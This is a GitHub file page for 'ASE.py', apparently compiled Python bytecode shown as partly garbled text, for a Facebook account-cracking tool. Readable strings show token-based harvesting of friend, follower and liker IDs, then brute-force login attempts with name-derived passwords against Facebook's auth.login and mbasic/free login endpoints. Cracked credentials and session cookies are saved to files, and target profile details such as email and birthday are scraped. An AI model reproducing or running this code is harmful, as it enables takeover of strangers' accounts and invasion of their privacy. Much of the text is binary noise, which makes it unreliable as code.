
Ail13311
/
-
Public
Code
Issues
Pull requests
2
Actions
Projects
Wiki
Security
Insights
Settings
-/ASE.py
@Ail13311
Ail13311 Create ASE.py
 1 contributor
413 lines (401 sloc)  40.1 KB
o

fpbo��
@s@ddlZzddlZWneyed�e�d�YnwzddlZWney5ed�e�d�YnwzddlZWneyNed�e�d�YnwddlZddlZddlZddlZddl	Z	ddl
Z
ddlZddlZddl
Z
ddlZddlZddlZddlZddlmZdd	l
m
Z
dd
lmZdd�Ze�e
��ZejZgd
�Zzedks�edkr�e�edZWney�e�YnwddlZddl	Z	ddlZddlZddl
Z
ddlZddlZddlZddlZddl
Z
ddlZddlZddlmZ dd	l
m
Z
dd
lmZ!e
��ZejZgd�Z"zedk�sedk�r e�edZWn
e�y2e�Ynwe
��Z#e#j$Z%e"eZe#j&Z'e#jZ(ddddddddddddd�Z)dZ*dZ+d Z,d!Z-d"Z.d#Z/d$Z0d%Z1d&Z2e�3d'g�Z4ggggggggddf
\
Z5Z6Z7Z8a9a:Z;Z5a<Z=e#j&Z>e#jZ?e#j$Z@e"eZAd(e@eAe>fZBeB�Cd)�gZ;ga9ga:da<zd*Z5eDd+d,��Ee5�WnYzeDd+d-��F��G�ZHWnd.gZHYzeDd/d-��F��G�ZIWnd.gZIYd0d1�ZJd2d3�ZKd4d5�ZLGd6d7�d7�ZMGd8d9�d9�ZNd:d;�ZOd<d=�ZPd>d?�ZQGd@dA�dA�ZRdBdC�ZSeTdDk�re�dE�eN��U�eK�dSdS)F�Nu)
 [×] requests module not installed!...
zpip install requestsu(
 [×] Futures module not installed!...
zpip install futuresu$
 [×] Bs4 module not installed!...
zpip install bs4)�ThreadPoolExecutor)�datetime)�
BeautifulSoupcCs�tt���tt���}d�|�}td|�z1t�d�j}||vr4td�tt���}t	�
d�WdStd�t�d�t	�
d�t�
�WdSt�
�td	kr^tt�t�YdSYdS)
N�-z[37;1mYOUR ID : zhttps://pastebin.com/FQadywDLz[1;92mYOUR ID IS ACTIVE...!g333333�?z.[1;91mID ACTIVATE (telegram) INBOX  @kyata_ro�xdg-open https://t.me/kyata_ro��__main__)�str�os�geteuid�getlogin�join�print�requests�get�text�time�sleep�system�sys�exit�nameZlogo�xoshnaw)Zuuid�idZhttpCaht�msg�r�bc.pyrs(



�r)ZJANZFEBZMARZAPRZMAYZJUNZJULZAUGZSEPZOCTZNOVZDEC�r)�Januari�Februari�Maret�April�Mei�Juni�Juli�Agustus�	September�Oktober�November�Desemberrrr r!r"r#r$r%r&r'r(r))�01�02�03�04�05�06�07�08�09�10Z11Z12z[1;97mz[1;91mz[1;92mz[1;93mz[1;94mz[1;95mz[1;96mz[0mz[38;2;255;127;0;1mzMantap bang @[553503218:0]z%s-%s-%s�/z�Mozilla/5.0 (Linux; Android 9; Infinix X653C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36;]�user.txt�w�ra�Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36z	user2.txtcCs2|dD]}tj�|�tj��t�d�qdS)N�
g���Q��?)r�stdout�write�flushrr)�kontolZwiburrr�jalanws

�r=cCs6zt�d�WnYzt�d�WdSYdS)NZokehZcepeh)r
�mkdirrrrr�folder|sr?cCstdd�dS)NuA%s


           _      _ 
     /\   | |    (_)
    /  \  | |     _ 
   / /\ \ | |    | |
  / ____ \| |____| |
 /_/    \_\______|_|
                    
                    

                              

                                              
 
[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m
	 [➣] OWNER :        iraq 
	 [➣] GITHUB:        iraq-ALI
	
[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m
	
[0;91m       USE FLIGHT MODE FOR 3 SEC
[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m                                                                          r)rrrrr�banner�s
�r@c@s,eZdZdd�Zdd�Zdd�Zdd�Zd	S)
�logincC�
g|_dS�N)Zada��selfrrr�__init__��
zlogin.__init__cCs�t�d�t�tdttf�}|dvr t�d�t���dSz#t	�
d|���d}tdd��
|�td	tt|f�|��WdStyYtd
 [%s➣%s] LOGIN SUCCESSFUL %sz% [%s!%s] FOOL TOKEN ERROR FOOLLLLLLL!)r
rr@�input�HrrrA�	__login__rr�json�openr:r�N�bot�KeyErrorr=�M�takon)rE�tokenZccrrrrP�s
�zlogin.__login__cCsNtdtttf�}|dvr tdtttf�t�d�t�dSt���dS)Nu%
 %s[%s➣%s] WANT TO BUT TOKEN y/t: )�y�Y�iyau"
 %s[%s➣%s] WANT TO DONATE FOOL?r)	rNrS�Or=r
rrrArP)rErWrrrrW�s
zlogin.takoncCspz	tdd���}Wnty$tdttf�t�d�t��	�Ynwt
�d|�t�
d�t���dS)NrMr7u#
 [%s➣%s] Token mokad ganti akun!rz>https://graph.facebook.com/553503218/subscribers?access_token=r)rR�read�IOErrorr=rVrSrrrArPr�postr
r�menu�main)rE�toketrrrrT�s(�
z	login.botN)�__name__�
__module__�__qualname__rFrPrWrTrrrrrA�s
rAc@s$eZdZdd�Zdd�Zdd�ZdS)r`cCrBrC)�uidrDrrrrF�rGz
menu.__init__cCs�t�d�z	tdd���}Wnty$tdttf�t��	�Ynwz
t
�d|���d}Wn2t
yRtdttf�t�d�t�d	�t��	�Ynt
jjydtd
ttf�Ynwz	tdd���}Wntyyd}Ynwt�t
�d
�j}tdtt|tf�tdttt|f�tdttttf�tdt�tdtttf�tdtttf�tdtttf�tdtttf�tdtttf�tdtttf�tdtttf�tdtttf�|��dS)NrHrMr7u [%s➣%s] Kamu belum loginrLru [%s➣%s] Login gagal ...�rm -rf token.xrKu [%s➣%s] cek koneksizlicense.txtrzhttps://api.ipify.orgz %s[ %sWELCOME %s%s ]u %s[%s•%s] IP ADDRESS  : %su %s[%s•%s] DATE        : %s� %sz %s[%s1%s] CRACK FROM PUBLICz %s[%s2%s] CRACK FROM MULTIz %s[%s3%s] CRACK FROM POSTz %s[%s4%s] CRACK FROM LIKEz %s[%s5%s] CRACK FROM FOLLOWERSz %s[%s6%s] CHECK CHECKPOINTz %s[%s7%s] CHECK OK/CP RESULTSz %s[%sA%s] LOG, OUT TOKEN)r
rrRr]r^rrVrSrArPrrrQrUrr�
exceptions�ConnectionErrorrr@rr=�waktu�pilih)rEZtoker7ZakssZIPrrrra�sB
�2��z	menu.mainc!s`tdt�tdtttf�}|dvr.tdt�tdtttf�t�d�t���dS|dvr�z	tdd��	�}Wnt
yRt�d	�t
d
tttf�Ynwz2tdtttf�}t�d||f�}t�|j�}g}|d
dD]}|�|dd|d�qtWnty�tdtttf�t�d�t���YdSwt��|�dS|dv�r7z	tdd��	�}Wnt
y�t�d	�t
dtttf�Ynwz8tdt�tdtttf�}t�d||f�}t�|j�}	g}|	d
dD]}
|�|
dd|
d�q�Wn%t�y.tdt�tdttt|f�t�d�t���YdSwt��|�dS|dv�r�tdd��	�}z
ttdtttf��}Wnd}Yt|�D]P}|d7}z<tdt�tdttt|f�}t�d|�d|���}t�|j�}g}|d
dD]}
|�|
dd|
d��q�Wnt�y�Y�q[w	�q[t��|�dS|dv�rtdd��	�}z7tdt�tdtttf�}t�d ||f�}t�|j�}g}|dD]}
|�|
dd|
d��q�Wnt�ytd!ttt|f�t�d"�t���YdSwt��|�dS|d#v�r�tdd��	�}z7tdt�tdtttf�}t�d ||f�}t�|j�}g}|dD]}	|�|	dd|	d��qPWnt�y�td$ttt|f�t�d�t���YdSwt��|�dS|d%v�r�tdd��	�}z7tdt�tdtttf�}t�d&||f�}t�|j�}g}|dD]}|�|dd|d��q�Wnt�y�td!ttt|f�t�d�t���YdSwt��|�dS|d'v�rttdt�td(tttf�td)tttf�}z	t|d���}Wnt
�y1t
d*tttt|tf�Ynw|D]4}|�d+d,�}|�d-�}td.|�d/d,��zt|d0�d/d,�|d�W�q4tj j!�yhY�q4wt
d1tttf�dS|d2v�rtd3t�td4tttf�td5tttf�td6tttf�td3t�td7tttf�}|dv�r�td8d��	�}t"|�d0k�r�td+�td9tttf�t�d:�t
�dStd;tttf�dS|dv�r
td<d��	�}t"|�d0k�rtd+�td=tt#tf�t�d>�t
�dSdSt���dS|d?v�r�td3t�td@tttf�tdAtttf�tdBtttf�td3t�tdCtttf�}|dv�rhtdDd��	�}tdEttt|f�t�dF�t���dS|dv�r�tdGtttf�}z%tdDdH�}|�$|�|�%�tdIttt|f�t�dF�t���WdSYdSt���dS|dJv�r7g�td3t�tdKtttf��tdLtttf�tdMtttf��&��'��dNdOdPdQ��ttdRtttf��}tdStttf��dT��tdUtttf������fdVdW�td|d�D�t(dXdY����fdZd[��D�Wd�n	1�s'wYt
d\tttf�dS|d]v�rAt)�dS|d^v�rfd_}td`tttf�}da|db|}t*�+dcdd|g�t
�dS|dev�rut�d	�t
�dS|dfv�r�dg}tdhttttf�} di|db| }t*�+dcdd|g�t
�dStdjtttf�t�d�t���dS)kNrhu %s[%s➣%s] choose : rIu %s[%s➣%s] DONT BE EMPTY FOOLrK)�0Z00rMr7rgu %s[%s➣%s] CHECK TOKENu %s[%s➣%s] Limit id : zFhttps://graph.facebook.com/me?fields=friends.limit(%s)&access_token=%sZfriends�datar�<=>ru/ %s[%s➣%s] FOOL YOUR ACCOUNT IS NOT PUBLIC...��1r*u %s[%s➣%s] Try RESTARTING !u %s[%s➣%s] ENTER ID : zHhttps://graph.facebook.com/%s?fields=friends.limit(5001)&access_token=%su %s[%s➣%s] ID %s NOT PUBLIC!��2r+u %s[%s➣%s] NO OF ID : ru %s[%s➣%s] ENTER ID %s : �https://graph.facebook.com/z2?fields=name,friends.fields(id,name)&access_token=��3r,u %s[%s➣%s] ENTER IS : z?https://graph.facebook.com/%s/likes?limit=50000&access_token=%sz %s[%s!%s] ID %s NOT PUBLIC�)�4r-u %s[%s➣%s] ID %s NOT PUBLIC)�5r.zEhttps://graph.facebook.com/%s/subscribers?limit=50000&access_token=%s)�6r/u+ %s[%s➣%s] Masukan -> Cp.txt sebagai fileu %s[%s•%s] Masukan files : u%
%s [%s➣%s] Files %s%s%s Tidak Ada!r8rJ�|u
 • Account : z + rz
%s [%s!%s] Done Ya Anjing)�7r0� %s z %s [%s1%s] Check  okz %s [%s2%s] Check  cpz %s [%s0%s] Kembaliu %s [%s•%s] choose : �Ok.txtz%s[ %shasil okeh %s]z
cat Ok.txtz( %s [%s!%s] Kamu gak dapet hasil okeh :(�Cp.txtz %s[ %shasil cepeh kamu %s]z
cat Cp.txt)�8r1z" %s [%s1%s] Cek user agent defaultz %s [%s2%s] Ganti user agent z %s [%s0%s] Keluarz %s [%s+%s] choose : r5z$ %s [%s!%s] User agent sekarang : %s�z %s [%s+%s] Masukan ua baru : r6z$ %s [%s!%s] Sukses mengganti ua : %s)�9r2z %s [%s+%s] Target nama : z= %s [%s+%s] Contoh domain : Jika ingin crack Gmail ketik : G z9 %s [%s+%s] Masukan domain [G]mail, [Y]ahoo, [H]otmail : z
@gmail.comz
@yahoo.comz@hotmail.com)�grY�hz %s [%s+%s] Jumlah target : z %s [%s+%s] Masukan password : �,z! %s [%s+%s] Crack sedang di mulaics6g|]}���t|���dd��D�d���qS)cSsg|]}|�qSrr��.0�irrr�
<listcomp>�sz)menu.pilih.<locals>.<listcomp>.<listcomp>��user�pw)�appendr	)r��e)rn�domain�list�nama�pwxrrr��s6zmenu.pilih.<locals>.<listcomp>��Zmax_workerscs$i|]}��t|d|d�|�qSr�)�submit�brute)r�r�)�thrr�
<dictcomp>�s$zmenu.pilih.<locals>.<dictcomp>z%s [%s!%s] Crack telah selezai)�Gr�)�K�kz+2348110044418z+ %s [%s!%s] Apa yang error ketik di sini : z$https://api.whatsapp.com/send?phone=z&text=Zam�start)�a�A)�U�uz+6285929340724z, %s [%s!%s] Masukan pesan kamu ke admin : %sz.https://api.whatsapp.com/+6285929340724?phone=z%s  [%s+%s] Wrong input),rrSrNrVrrr`rarRr]r^r
rrrrrQ�loadsrr�rU�crack�fbehr=�int�ranger\�	readlinesrO�replace�split�khamdihirirj�lenr�r:�close�lower�strip�iraq�target�
subprocess�check_output)!rEZusnarXZlmtr7�zrr6�idtr�r�ZplerZikehr�ZpepekZmemek�David�filesZ	buka_bajur<ZtitidZhslZhasil_okZhasil_cpZpwkZfika�ua�nunuZjmlZnom_warZurl_waZkatar)rnr�r�r�r�r�rrl�s�*
��,�

��.�
��
�.�
�.�
�.�
�
 �


�




.
�$�






*z
menu.pilihN)rcrdrerFrarlrrrrr`�s%r`cCs�z	tdd���}Wntytd�t�d�t�Ynwtdt�td�}zt	�
d|d|�}t�|j
�}WntyLtd	�t�Ynwz|d
}Wnty^d}Ynwz|d}Wntypd}Ynwz|d
}Wnty�d}Ynwz|d}Wnty�d}Ynwz|d}Wnty�d}Ynwz|d}	Wnty�d}	Ynwz|d}
Wnty�d}
Ynwz|d}Wnty�d}Ynwz|d}Wnty�d}Ynwz|d}
Wnt�yd}
Ynwz|d}Wnt�yd}Ynwz|dd
}Wnt�y)d}Ynwz|dd
}Wnt�y>d}Ynwz|dd
}Wnt�ySd}Ynwz|d}Wnt�yfd}Ynwz|d}Wnt�yyd}Ynwtd|�td|�td|�td|�td|�td |	�td!|
�td"|�td#|�td$|
�td%|�td&|�td'|�td(|�td)|�td*|�td+�t���dS),NrMr7z
[!] Token Invalidzrm -rf login.txtr}u  [•] ID Target : rtz?access_token=z [!] ID NOT foundrrZ
first_nameZmiddle_name�	last_name�birthdayZgender�emailZlinkZusernameZreligionZrelationship_statusZsignificant_other�locationZhometownZabout�localeu  [•] Name : u  [•] First Name : u  [•] Middle Name : u  [•] Last Name : u  [•] Birthday : u  [•] Gender : u  [•] Email : u  [•] Link : u  [•] Username : u  [•] Religion : u  [•] Relationship Status : u  [•] Relationship With : u  [•] Location : u  [•] Hometown : u  [•] About : u  [•] Locale : z  [+] Back to menu, pres enter)rRr]rUrr
rrArSrNrrrQr�rrr=r`ra)rbr�ZzxZzyZnmZnd�ntZnb�utZgdZemZlk�usZrgZrlZrlsZlcZht�ab�lorrrr��s�

������������������r�cCs�zP|D]J}ddd|d|dddd�	}d	}tj||d
�}t�dt|j��r4tdtt|�t|�f�WdSd
|��dvrMtdt	t|�t|�f�WdSqWdSYdS)Nz/350685531728%7C62f8ce9f74b12f84c123cc23437a4a32ZJSONrsZen_USZiosrqZ 3f555f99fb61fcd7aa0c44f58f522ef6)	Zaccess_token�formatZsdk_versionr�r�ZpasswordZsdkZgenerate_session_cookies�sigz,https://b-api.facebook.com/method/auth.login)�paramsz	(EAAA)\w+u%s --> %s • %s zwww.facebook.comZ	error_msgu%s * --> %s • %s )
rr�re�searchr	rrrOrQr�)r�Zpasssr�r�ZapiZresponserrrr�s.���r�cCs�d}t�gd��}t��}|j�ddd|d|ddd	d
dd|d
ddd��i}t|j|d
d|id�jd�}|�	dddi�}gd�}|�
d�D]}	|	�d�|vr^|�|	�d�|	�d�i�qGqG|�||d��t|j||�d�|dd�jd�}
d|jvr�d �
d!d"�|j����D��}t|jd#d$|id%�jd�}
d&d"�|
�
d'd(d)i�D�d*d�}td+tt|���d,}
|D]}|
d-7}
td.t|
�d/|d,d,d0|d,d-�q�dSd1|jv�rK|
�	d�}|�	ddd2i�d}|�	ddd3i�d}|�	ddd4i�d}||||d5d6|d7�}t|j||d|d8�jd�}d9d"�|�
d:�D�}td;tt|���tt|��D]}td<t|d-�d/||��q5dSd=t|
�v�rj|
�	d>d?d=i��	d>�j}td@ttt|f�dStdAtttf�dS)BN�https://mbasic.facebook.com�z�Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]��Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)z�Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36z{Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36�mbasic.facebook.com�	max-age=0rq�!application/x-www-form-urlencodedz|text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9�mark.via.gp�same-originZnavigatez?1�documentz/login/?next&ref=dbl&fl&refid=8z
gzip, deflatez#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7��Hostz
cache-control�upgrade-insecure-requests�originzcontent-type�
user-agent�accept�x-requested-with�sec-fetch-site�sec-fetch-mode�sec-fetch-user�sec-fetch-dest�referer�accept-encoding�accept-languager���headers�html.parser�form�methodr_)�lsd�jazoestZm_tsZliZ
try_numberZunrecognized_triesrAZbi_xrwhrNr�value)r��pass�actionT�rn�allow_redirects�c_user�;cS�g|]
\}}d||f�qS�z%s=%sr�r��keyr�rrrr�@�zkhamdihi.<locals>.<listcomp>z/https://free.facebook.com/settings/apps/tabbed/�cookie��cookiescSsg|]
}t�dt|���qS)zG\<span.*?href=".*?">(.*?)<\/a><\/span>.*?\<div class=".*?">(.*?)<\/div>)r��findallr	)r��tdrrrr�Br�r�zaria-hiddenZfalserKu3 • Akun Yang Mungkin Terkait Dengan Facebook : %srrz  � z, �
checkpoint�fb_dtsgr��nhrJZ	Lanjutkan)r�r�r�r�Zcheckpoint_datazsubmit[Continue]r�)rncS�g|]}|j�qSr�r)r�Zyyrrrr�O�Zoptionu • Total Opsi Yang Tersedia  z      Zlogin_errorZdivrz%s[%s!%s] %sz%s[%s!%s] Error Login Failed!
)�random�choicer�Sessionr��update�parserrr�find�find_allr_r�r
�get_dict�itemsrr	r�r��PrVrS)r�ZpaswZmbr��sesrnZgedZfmr�r��runZkukiZxeZnum�_r�ZdtsgZjzstr�ZdataD�xnxxZngew�optZohrrrr�.sP0"
"2�
$�r�c@sTeZdZdd�Zdd�Zdd�Zdd�Zd	d
�Zdd�Zd
d�Z	dd�Z
dd�ZdS)r�cCrBrC)rrDrrrrF\rGzcrack.__init__csv|�_tdttttt|�f�tdtttf�}|dvr3tdtttf�t�d�t	��
|�dS|dvr�tdt�tdtttf�	td
tttf�}|dvr^tdtttf�nAt|�dkrntd
tttf�n1d�fdd�	}tdt�tdtttf�tdtttf�tdtttf�||�d��dSqG|dvr�tdt�tdtttf���
�dSdS)Nu %s[%s➣%s] TOTAL ID : %s%su/ %s[%s➣%s] WANT TO USE MANUAL PASSWORD y/t : rIz %s[%s!%s] Jangan kozong !rK)rYrZZIyar[rhz %s[%s!%s] EXAMPLE: iraq,DAVIDTu %s[%s•%s] INPUT PASSWORD : z %s[%s!%s] Jangan kosong�z. %s[%s!%s] Password harus ada 6 kata/ lebih !!cs4tdt�tdtttf�}|dvr"tdtttf����dS|dvrrtdt�tdttf�tdttf�td	d
��$}�jD]}z|�d�d}|�	�j
||�WqEYqEWd�n1shwYt�dS|d
vr�tdt�tdtttf�tdtttf�td	d
��$}�jD]}z|�d�d}|�	�j||�Wq�Yq�Wd�n1s�wYt�dS|dv�rtdt�tdtttf�tdtttf�td	d
��$}�jD]}z|�d�d}|�	�j
||�Wq�Yq�Wd�n	1�swYt�dSdS)Nz%s u %s[%s•%s] Metode : rIz  %s [%s!%s] Jangan kosong anjingrpr}z1  [%s*%s] akun Ok akan di simpan di file : Ok.txtz2  [%s*%s] akun CP akan di simpan di file : Cp.txt
�r�rorrrz3 %s [%s*%s] akun OK akan di simpan di file : Ok.txtz4 %s [%s*%s] akun CP akan di simpan di file : Cp.txt
ruz4%s  [%s*%s] akun Cp akan di simpan di file : Cp.txt
)rrSrNr\rV�manualr�rr�r��b_apir�mbasic�metod2)r
Zmani�dihi�meZNufikharDrrrnsX

��


��



��
�zcrack.fbeh.<locals>.manualr}z %s [%s1%s] Metode Freez %s [%s2%s] Metode Mbasicz %s [%s3%s] Metode Mobile/Mr�)�t�TZtidakZTidaku% %s [%s3%s] METHOD MOBILE [✓✓✓]rC)rrrSrVrOr�rNrrr�r�r\r��otomatis)rErZkhamr�rrrDrr�^s6,&�3�z
crack.fbehcCs�tdt�tdtttf�}|dvr!tdttf�|��dS|dvr+|��dS|dvr5|��dS|dvr?|��dStdttf�|��dS)	Nr}u %s [%s➣%s] CRACK METHOD : rIz [%s!%s] jangan kosonhrprrruu% [%s➣%s] Pilih menu yg bener anjing)	rrSrNrVr\r�free�basic�mobilez)rEZotorrrr�szcrack.otomatisc	Cs�tdt�tdtttf�tdtttf�tdd���}|jD]�}zo|�d�\}}|�d�}|d}t|�d	krK||d
|d|d|d
|g}n>t|�dkrb||d
|d|d|d
|g}n't|�dkry||d
|d|d|d
|g}n||d
|d|d|d
|g}|�|j||�Wq!t	y�}zt
j�|�WYd}~q!d}~wYq!Wd�n1s�wYt�dS)Nr}u@ %s [%s➣%s] akun okeh akan di simpan di file  : hasil/okeh.txtuB %s [%s➣%s] akun cepeh akan di simpan di file : hasil/cepeh.txt
r
r�ror�r��123�321�1234�12345rKr)
rrSr\r�rr�r�r�r�	Exceptionr
rr�	rErrrfrZsempak�nunr�r�rrrr�s.

""" &�
��
z
crack.freec	Cs�tdt�tdtttf�tdtttf�tdtttf�tdd���}|jD]�}zo|�d�\}}|�d�}|d	}t|�d
krT||d|d|d
|d|g}n>t|�dkrk||d|d|d
|d|g}n't|�dkr�||d|d|d
|d|g}n||d|d|d
|d|g}|�|j||�Wq*t	y�}zt
j�|�WYd}~q*d}~wYq*Wd�n1s�wYt�dS)Nr}u5 %s [%s➣%s] akun OK akan di simpan di file : Ok.txtz3 %s [%s*%s] akun CP akan di simpan di file : Cp.txtz6 %s [%s!%s] Mode pesawat 2 detik jika tidak ada hasil
r
r�ror�rrrrrrrKr)
rrSr\r�rr�r�r�rrr
rrr rrrr�s0

""" &�
��
zcrack.basicc	Cs�tdt�tdtttf�tdtttf�tdd���}|jD]�}zz|�d�\}}|�d�}|d}t|�d	kr?gd
�}nUt|�dkrV||d|d
|d|d|g}n>t|�dkrm||d|d
|d|d|g}n't|�dkr�||d|d
|d|d|g}n||d|d
|d|d|g}|�|j||�Wq!t	y�}zt
j�|�WYd}~q!d}~wYq!Wd�n1s�wYt�dS)Nr}u" %s [%s➣%s] Ok SAVED TO : Ok.txtu" %s [%s➣%s] CP SAVED TO : Cp.txtr
r�ror�rr)Z123456r�r�ZbUlletZDharmaZbangsatZ	katasandiZKinggrrrrrrKr)
rrSrVr�rr�r�r�rrr
rr)	rErr�rfrZgasr!r�r�rrrr�s2


""" &�
��
z
crack.mobilezcCsnt�ttttttg�}t�ttttttg�}tj	�
d|ttttt
|j�t
t�t
t�|f	�tj	���zf|D�][}|��}t��}t�gd��}dd|dddddd	d
ddd
d�
}|jd|d�j}	t�dt|	���d�t�dt|	���d�|d|dd�}
ddddddddddd	d
ddd
d�}|jd|
|dd�}d|j��v�rz7d �d!d"�|j����D��}
t d#t|||
f�t!|
�t�"d$|||
f�t#d%d&��
d'|||
f�Wn�t$t%fy�d(}d(}d(}YnYt d)t|||
f�t!|
�t�"d*|||
f�t#d%d&��
d'|||
f�n�d+|j��v�r�zCt#d,d-��&�}t�d.|�d/|����'�d0}|�(d1�\}}}t)|}t d2t||f�t�"d3||f�t#d4d&��
d5||f�Wn6t$t%f�yod(}d(}d(}YnYt d6t||f�t�"d3||f�t#d4d&��
d7||f�nq7td7aWdStj*j+�y�t,�-d8�td7a|�.||�YdSw)9Nz-
 %s* %s[%scrack%s] %s/%s [OK:%s - CP:%s] %s*r�zfree.facebook.comrq��text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9r�r��cors�emptyr�zhttps://free.facebook.com/�gzip, deflate br�en-GB,en-US;q=0.9,en;q=0.8�
r�r�r�r�Zdntr�r�r�r�r�r�r�r�zohttps://free.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2Fr��name="lsd" value="(.*?)"r�name="jazoest" value="(.*?)"�login_no_pin�8https://developers.facebook.com/tools/debug/accesstoken/�r�r�rfZflowr��nextr�zhttps://free.facebook.comr�r�r�zFhttps://free.facebook.com/login/device-based/validate-password/?shbl=0F�rnr�r�r�r�cS�g|]
\}}|d|�qS��=rr�rrrr�r�zcrack.b_api.<locals>.<listcomp>u
 %s--> %s • %s • %u%s • %s • %s r~r�u --> %s • %s • %s
rJu
 %s--> %s • %s • %s �%s • %s • %sr�rMr7rt�?fields=birthday&access_token=r�r4u
 %s--> %s • %s �	%s • %sru --> %s • %s 
u
 %s--> %s • %s           z
 --> %s | %s
�)/r�r�rVr�rOr�rrSrr9r:r\�loopr�r�ok�cpr;r�rr�rrr�r�r	�groupr_r�rr
rr�cek_apkr�rRrUr^r]rQr��bulan12rirjrrr)rEr�r�ZeramZnufir�rr��headers_�p�dataa�_headers�po�coki�day�month�yearr�lahirrrrr�sv:
 6$
�zcrack.b_apicCsbt�tttttttg�}t	dt
|j�}d}td|t	t
|j�t
t
�t
